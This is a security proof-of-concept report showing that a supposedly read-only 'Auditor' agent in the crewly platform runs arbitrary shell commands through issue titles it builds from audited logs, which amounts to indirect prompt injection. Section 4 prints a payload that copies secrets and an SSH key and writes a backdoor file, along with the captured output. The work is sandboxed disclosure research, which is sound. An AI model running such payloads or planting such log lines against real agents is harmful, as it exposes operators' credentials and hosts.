# PoC report — crewly read-only Auditor → RCE via `create_github_issue` shell injection

## 1. What the PoC is
Two **local, benign, network-isolated** demonstrations that the crewly "Auditor" agent — which
the code documents as read-only "without any ability to modify system state"
(`auditor-tools.ts` lines 6, 24) and which has no shell tool — executes arbitrary OS commands
when shell metacharacters appear in the `title` of its `create_github_issue` tool.

- **`scenario.sh` + `exfil-poc.mjs` — realistic end-to-end (recommended).** Plants a mock
  operator environment (fake API tokens + a fake SSH key under `$HOME`) and a mock "audited
  activity" log containing an attacker-controlled line, then runs the real `create_github_issue`
  path on it and shows the Auditor **exfiltrate the secrets and write a backdoor file**.
- **`poc.mjs` + `run.sh` — minimal confirmation.** The same sink with a single benign
  `$(touch marker)` payload and a benign control title, for the smallest possible repro.

Both reproduce `create_github_issue.execute()`'s **exact** command construction from
`packages/crewly-agent/src/runtime/auditor-tools.ts` (crewly v1.20.470, commit `537cf52`),
including its only mitigation — `String.replace(/"/g, '\"')`. All payloads are benign and
operate only on files we plant; no real secrets, no network, no deployed instance.

## 2. Reproducibility
Deterministic; one command each. Requires only `node` and `bubblewrap` (`bwrap`).

```
# realistic scenario (recommended)
tools/sandbox.sh findings/batch-10/crewly/poc sh -c 'sh /work/scenario.sh'

# minimal confirmation
tools/sandbox.sh findings/batch-10/crewly/poc sh -c 'PATH=/work/bin:$PATH sh /work/run.sh'
```

`tools/sandbox.sh` runs under bubblewrap with **`--unshare-net` (no network)**, an empty tmpfs
`$HOME` (so the "secrets" are freshly planted fakes, isolated from the real user), a read-only
system, and a cleared environment.

## 3. How it affects real-world usage
crewly is a multi-agent "factory": agents run on the operator's machine, and the platform
enforces a deliberate privilege model — a `validateBashCommand` denylist that blocks
`rm`/`curl`/`wget`/etc., an approval gate on the `destructive` `bash_exec` tool, and a
`readOnlyMode` that blocks all `WRITE_TOOLS`. The **Auditor** sits below all of that: by design
it only observes and writes "structured bug reports," with no command tool.

This bug collapses that boundary. Per crewly issue **#178**, the Auditor does *periodic
monitoring and automatic GitHub issue creation* — it composes issue titles from the agent
activity and logs it reviews. So the realistic trigger is **indirect prompt injection**: an
attacker gets a crafted line into something the Auditor audits (a log line, a commit message, a
task note), and when the Auditor auto-files the issue, the `$(...)` in that line runs on the
operator's host with the agent-runner's privileges — reading secrets, writing files, pivoting.
Because the injection fires during shell parsing, it does **not** need a configured/
authenticated `gh` or outbound network (the scenario's `gh` fails, yet the payload runs).

## 4. Realistic scenario — attack chain and result
**Mock environment planted (all fake):** `$HOME/.crewly/secrets.env` (3 fake tokens),
`$HOME/.ssh/id_ed25519` (fake key). **Attacker input:** one line in `/work/audited-activity.log`:

```
... note [Critical] auth bypass in login path $(cat $HOME/.crewly/secrets.env $HOME/.ssh/id_ed25519 > /work/EXFIL-to-attacker.txt; echo cron-job-added-by-auditor > $HOME/.crewly/backdoor)
```

`exfil-poc.mjs` reads that log (as the Auditor would), derives the issue title from the
`[Critical]` finding line, and runs the verbatim `create_github_issue` construction. Captured
output:

```
[auditor] derived issue title from audited log:
          "agent coder-1 note [Critical] auth bypass in login path $(cat $HOME/.crewly/secrets.env ... )"
/bin/sh: -c: line 1: unexpected EOF while looking for matching `"'     <- dedup call: query truncated mid-$( ; harmless
gh: To use GitHub CLI in automation, set the GH_TOKEN environment variable.
[gh] invocation failed (expected: no gh auth/network in sandbox) — injection already ran

## IMPACT — what a tool documented 'read-only, without any ability to modify system state' just did
   [CONFIDENTIALITY] secrets exfiltrated to /work/EXFIL-to-attacker.txt:
      | CREWLY_API_TOKEN=sk-FAKE-crewly-DO-NOT-USE-0000000000000000
      | GITHUB_TOKEN=ghp_FAKE0000000000000000000000000000000000
      | OPENAI_API_KEY=sk-FAKE-openai-0000000000000000000000000000
      | -----BEGIN OPENSSH PRIVATE KEY----- / MOCK-KEY-NOT-REAL / -----END-----
   [INTEGRITY] state modified — wrote $HOME/.crewly/backdoor: cron-job-added-by-auditor

RESULT: CONFIRMED — the read-only Auditor read operator secrets AND modified state via an issue title.
```

Mapping to impact:
- **Confidentiality (High):** the read-only Auditor read `$HOME` secrets/SSH key and copied them
  to an attacker-controlled file — the kind of data that would be POSTed out with network.
- **Integrity (High):** it wrote a new file (`backdoor`) — directly contradicting "without any
  ability to modify system state."
- **Availability (High):** the same primitive can delete/kill (not exercised; benign run).

Note on the `EOF` line: the dedup `gh issue list --search "<title[:50]>"` call (a second
injection sink, `auditor-tools.ts:233/237`) truncates the title to 50 chars, cutting mid-`$(`,
so *that* call fails to parse — while the `gh issue create` call uses the full title and runs
the complete payload. The failure of one sink does not stop the other.

## 5. Files
- `scenario.sh` — plants the mock env + attacker log, runs the Auditor path, checks impact.
- `exfil-poc.mjs` — models the Auditor deriving an issue title from audited activity, then the
  verbatim `create_github_issue` construction.
- `poc.mjs` / `run.sh` — minimal single-payload confirmation + benign control.
- `poc.pdf` — standalone reproduction guide (this report in PDF form).

Benign payloads only; mock/fake secrets; local clone only; no deployed instance touched;
nothing filed.
